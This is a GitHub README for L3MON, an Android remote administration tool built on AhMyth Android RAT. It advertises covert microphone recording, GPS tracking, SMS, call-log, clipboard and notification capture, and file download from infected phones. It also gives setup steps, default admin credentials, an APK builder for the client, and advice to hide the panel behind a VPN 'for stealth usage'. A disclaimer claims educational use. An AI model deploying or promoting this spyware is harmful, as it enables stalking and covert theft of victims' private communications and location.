<p align="center">
  <img src="https://github.com/fahimahamed1/L3MON/raw/main/server/web/assets/logo/logo.png" height="60"><br>
  <b>L3MON - Modern Android Remote Management Suite</b><br>
  Powered by Node.js & Java 17+ | Updated 2025
</p>

---

## ✨ Features
- Real-time GPS Logging
- Microphone Audio Recording
- Contact List Viewer
- SMS Logs & SMS Sender
- Call Logs Viewer
- Installed Apps Viewer
- Stub Permissions Access
- Live Clipboard Monitor
- Live Notification Tracker
- WiFi Network Log Viewer
- File Explorer & Downloader
- Command Queue Execution
- Built-in APK Builder (Java 17+ Required)
- Modern APK Signing with v1/v2/v3/v4 signature schemes
- Updated Apktool v2.12.0 for better compatibility

---

## ⚙️ Requirements

- **Java Runtime Environment 17 or newer** (Recommended: Eclipse Temurin)
- **Node.js (v14 or later)**
- A Linux/Windows Server (VPS Recommended)

> 📝 **Note:** The project has been updated to fully support Java 17 with modern tools:
> - **Apktool v2.12.0** for Android compilation
> - **uber-apk-signer v1.3.0** for modern APK signing
> - **APK Signature Schemes v1, v2, v3, v4** support

---

## 🚀 Installation

1. **Install Java 17 or newer**

   - Ubuntu/Debian (Java 17):
     ```bash
     sudo apt-get install openjdk-17-jre
     ```
   - Fedora/RedHat (Java 17):
     ```bash
     sudo dnf install java-17-openjdk
     ```
   - Windows:
     - Download Java 17: [Eclipse Temurin](https://adoptium.net/)

2. **Install Node.js**
   - [Node.js Installation Guide](https://nodejs.org/en/download/package-manager)

3. **Install PM2 (Process Manager)**
   ```bash
   npm install -g pm2
   ```

4. **Clone & Setup the Project**
   ```bash
   git clone https://github.com/fahimahamed1/L3MON.git
   cd L3MON
   npm install
   pm2 start index.js
   pm2 startup
   ```

5. **Set Admin Login**
   - Stop server: `pm2 stop index`
   - Edit `L3MON/server/database/maindb.json`:
     - Set `"username": "yourname"`
     - Set `"password": "md5hash"` (use lowercase MD5 hash)
   - Restart: `pm2 restart index`

   > 🔐 **Note:** The default admin credentials are:  
   > **Username:** `admin`  
   > **Password (MD5):** `21232f297a57a5a743894a0e4a801fc3` (which is `admin` in lowercase MD5)

6. **Open Web Panel**
   - Visit: `http://your-server-ip:22533`

---

## 🔐 Security Tips
- Use **nginx reverse proxy** for HTTPS
- Run behind **VPN** or **internal network** for stealth usage
- Change default ports

---

## Screenshots
| | | |
|:-------------------------:|:-------------------------:|:-------------------------:|
|<a href="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/call_log.png"> <img width="1604" src="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/call_log.png"> </a> |<a href="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/apk_builder.png"> <img width="1604" src="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/apk_builder.png"> </a> |<a href="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/clipboard.png"> <img width="1604" src="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/clipboard.png"> </a> |
|**Call Log** |**Apk Builder** |**Clipboard** |
|<a href="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/contacts.png"> <img width="1604" src="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/contacts.png"> </a> |<a href="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/devices.png"> <img width="1604" src="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/devices.png"> </a> |<a href="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/file_explorer.png"> <img width="1604" src="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/file_explorer.png"> </a> |
|**Contacts** |**Devices** |**File Explorer** |
|<a href="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/gps_log.png"> <img width="1604" src="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/gps_log.png"> </a> |<a href="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/sms_log.png"> <img width="1604" src="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/sms_log.png"> </a> |<a href="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/sms_send.png"> <img width="1604" src="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/sms_send.png"> </a> |
|**Gps Log** |**Sms Log** |**Sms Send** |
|<a href="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/installed_apps.png"> <img width="1604" src="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/installed_apps.png"> </a> |<a href="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/microphone.png"> <img width="1604" src="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/microphone.png"> </a> |<a href="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/notification_log.png"> <img width="1604" src="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/notification_log.png"> </a> |
|**Installed Apps** |**Microphone** |**Notification Log** |
|<a href="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/event_log.png"> <img width="1604" src="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/event_log.png"> </a> |<a href="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/login.png"> <img width="1604" src="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/login.png"> </a> |<a href="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/wifi_manager.png"> <img width="1604" src="https://raw.githubusercontent.com/fahimahamed1/L3MON/refs/heads/main/assets/images/wifi_manager.png"> </a> |
|**Event Log** |**Login** |**Wifi Manager** |
---

## 🙏 Credits & Dependencies

This project is built upon:

- [AhMyth Android RAT](https://github.com/AhMyth/AhMyth-Android-RAT)
- [express](https://github.com/expressjs/express)
- [lowdb](https://github.com/typicode/lowdb)
- [socket.io](https://github.com/socketio/socket.io)
- [leaflet.js](https://leafletjs.com/)
- [OpenStreetMap](https://www.openstreetmap.org)

### Modern Tools (Updated 2025)

- **Apktool v2.12.0** - Latest Android APK decompilation/compilation tool
- **uber-apk-signer v1.3.0** - Modern Java-compatible APK signing
- **Java 17+** - Latest LTS Java runtime support

---

## ⚠️ Disclaimer
> This tool is for **educational and legal internal use only**.
> Use it responsibly. Any misuse is at your own risk.
> The author provides **no warranty** and is **not responsible** for any damage.

---

## 📄 License
This project is licensed under the [MIT License](https://github.com/fahimahamed1/L3MON/blob/main/LICENSE).

---

<p align="center" style="font-weight: bold; color: #3498db;">L3MON v1.2.1 - Java 17+ Edition</p>
<p align="center" style="color: #95a5a6;">Modern Android Remote Management Suite</p>
<p align="center" style="font-size: small; color: #7f8c8d;">Updated 2025 | Enhanced with latest tools and Java 17+ support</p>
